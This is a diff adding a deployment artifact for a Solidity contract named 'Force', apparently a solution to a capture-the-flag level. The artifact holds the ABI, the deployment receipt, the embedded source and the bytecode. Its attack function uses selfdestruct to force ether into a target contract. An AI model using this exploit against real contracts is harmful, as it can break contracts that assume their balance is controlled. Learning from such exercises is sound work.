@@ -1,0 +1,63 @@
+{
+  "address": "0xcfACbabb4277461aA3CFe188E595B81f9b458Fcf",
+  "abi": [
+    {
+      "inputs": [],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "target",
+          "type": "address"
+        }
+      ],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0x0bbb3b7e8c260654436ca4af122e32e00d095feec63306bb53728d7709263027",
+  "receipt": {
+    "to": null,
+    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
+    "contractAddress": "0xcfACbabb4277461aA3CFe188E595B81f9b458Fcf",
+    "transactionIndex": 95,
+    "gasUsed": "92941",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x04802f179d1bd5ac7501d30db41ebc39fef91c30713a382c7b250ba25be94333",
+    "transactionHash": "0x0bbb3b7e8c260654436ca4af122e32e00d095feec63306bb53728d7709263027",
+    "logs": [],
+    "blockNumber": 8160016,
+    "cumulativeGasUsed": "6481161",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [],
+  "numDeployments": 1,
+  "solcInputHash": "9601fd5c10c34a6cfd6c2cff3f8d8d22",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Force.sol\":\"Force\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Force.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Force {\\n    constructor() payable {}\\n\\n    function attack(address target) external {\\n        selfdestruct(payable(target));\\n    }\\n\\n    receive() external payable {}\\n\\n}\",\"keccak256\":\"0x3ddf20661a0ec9d6273aef20b94cb5776a2077855cda2ba19175cc8209d62fee\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405260b8806100126000396000f3fe60806040526004361060205760003560e01c8063d018db3e14602b57600080fd5b36602657005b600080fd5b348015603657600080fd5b50604660423660046054565b6048565b005b806001600160a01b0316ff5b600060208284031215606557600080fd5b81356001600160a01b0381168114607b57600080fd5b939250505056fea26469706673582212206d0661e2850f954e0e9c76a232547546baf2e4f8bc4c7ab821c0dd33642fd42764736f6c63430008140033",
+  "deployedBytecode": "0x60806040526004361060205760003560e01c8063d018db3e14602b57600080fd5b36602657005b600080fd5b348015603657600080fd5b50604660423660046054565b6048565b005b806001600160a01b0316ff5b600060208284031215606557600080fd5b81356001600160a01b0381168114607b57600080fd5b939250505056fea26469706673582212206d0661e2850f954e0e9c76a232547546baf2e4f8bc4c7ab821c0dd33642fd42764736f6c63430008140033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [],
+    "types": null
+  }
+}
